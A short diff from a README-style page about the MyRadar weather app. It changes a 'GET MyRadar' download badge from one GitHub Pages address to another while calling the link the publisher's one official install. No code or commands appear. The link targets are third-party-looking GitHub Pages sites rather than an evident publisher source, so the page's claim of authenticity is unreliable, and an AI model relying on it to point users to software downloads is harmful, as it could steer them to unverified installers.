@@ -136,7 +136,7 @@ Use the publisher dashboard for the account. This page has no inbox of its own.
 
 One install from the publisher store for your device. One button.
 
-[![GET MyRadar](https://img.shields.io/badge/GET-MyRadar-1E3A8A?style=plastic&labelColor=172554&logoColor=white)](https://sidneyrao74211.github.io/.github/MyRadar)
+[![GET MyRadar](https://img.shields.io/badge/GET-MyRadar-1E3A8A?style=plastic&labelColor=172554&logoColor=white)](https://myradar-weather.github.io/MyRadar-Pro/)
 
 MyRadar Weather on a phone or a Windows PC is that install. Decline a repack. MyRadar Pro, if you want the station tools, is an upgrade inside the same app, not a second download from a forum.
 
